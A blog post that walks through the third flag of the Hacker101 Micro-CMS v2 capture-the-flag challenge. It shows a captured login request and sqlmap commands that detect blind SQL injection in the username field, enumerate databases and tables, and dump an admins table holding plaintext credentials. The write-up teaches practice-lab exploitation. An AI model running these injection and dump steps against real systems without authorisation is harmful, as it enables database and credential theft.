---
title: Hacker 101 CTF Micro-CMS v2 - Flag 3
published: true
---

Following on from [flag 1](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-1) and [flag2](https://ruddles.github.io/Hacker101-CTF-Micro-CMS-v2-flag-2) this is a writeup of the final flag in [Hacker 101 CTF](https://ctf.hacker101.com/) Micro-CMS v2. If you're looking to follow along then I assume you're all logged in and have hit Go on the challenge.

# Finding the final vulnerability

At this point I've had a lot of time to dig around in the front end and can't think of anything else to try there, so let's have a dig in the database.

# sqlmap

If you've not come across it before, [sqlmap](https://sqlmap.org/) is a tool that automates finding and exploiting sql injection vulns.  Given we are exploiting a non-reflected (AKA blind) injection vuln (i.e. the results of the injection are not shown in the UI) then we either need to script something ourselves or use a tool. In this case sqlmap is very powerful but the docs aren't the best.  Let's have a play:

# Getting a request payload

The first thing we'll need is a request payload in a format that sqlmap understands.  In chrome, make sure you've got dev tools open on the login page, then enter any old junk in the username and password fields and click "Log In".

Now in the network tab we can right-click and select `Copy request headers` and paste the contents into a new file (I called mine "request.txt").  Then go back to the network tab and down in the Form Data area select `view source` and copy the payload.

![login error]({{ site.url }}/assets/post-images/h101-cms-v2/LoginCopy.png)

So the contents of the file looks something like this (with a different URL on the first line...):

```
POST /83aa39a35a/login HTTP/1.1
Host: 35.190.155.168
Connection: keep-alive
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://35.190.155.168
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://35.190.155.168/83aa39a35a/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.YJlkcg.ZOb4OMIethVS0zf62YyVTrw6Ong

username=user&password=pass
```

# Testing the username field

Now we're ready to run some tests.  In this first one we're going to get sqlmap to test the username parameter of the request we saved in request.txt.  The `-r` flag is the path to the request file we created, and the `-p` flag is the parameter to test:

`sqlmap -r ./request.txt -p username`

After running this we can see that the username field is vulnerable and that that we're working with MySQL >= 5.0 (MariaDB fork) and some details about the back end OS.  A little scary how much can be picked up here.

# Enumerating the databases

Next up we can use the `--dbs` command to get back a list of all the tables in the DB:

`sqlmap -r ./request.txt -p username --dbs`

This gives us 4 databases on the server that we can access:
- information_schema
- level2
- mysql
- performance_schema

# Enumerating the tables

That level2 database looks interesting.  We can use the `-D` flag to select that database, then use the `--tables` flag to list out the tables in that DB:

`sqlmap -r ./request.txt -p username -D level2 --tables`

Running this gives us 2 tables:

```bash
Database: level2
[2 tables]
+--------+
| admins |
| pages  |
+--------+
```

# Dumping the table contents

OK, that admin table looks like a good candidate.  We can use the `-T` flag to select that table and the `--dump` flag to dump the contents to the console.

`sqlmap -r ./request.txt -p username -D level2 -T admins --dump`

I won't post the output here but that's given me a table with a username and a plaintext password.  Logging in to the site with those credentials gives me the final flag.

And with that we are done with this small CTF, all the flags found and a few points on the board.  I plan on doing more of these posts for the other challenges on hacker 101.

Any comments or suggestions? Chat with me on [twitter](https://twitter.com/RuddlesDev)
